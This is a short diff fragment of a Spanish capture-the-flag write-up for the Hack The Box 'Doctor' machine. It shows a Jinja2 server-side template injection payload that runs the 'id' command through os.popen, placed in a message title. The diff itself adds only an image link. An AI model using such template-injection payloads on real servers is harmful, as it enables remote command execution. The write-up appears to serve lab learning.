@@ -54,3 +54,5 @@ Parece ser que se puede explotar una vulnerabilidad llamada `Server Side Templat
 \{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}\}
 ```
 Creo un mensaje que contenga la inyección en el título
+
+![](/assets/images/Doctor-Hackthebox/doctor-inyeccion.png)
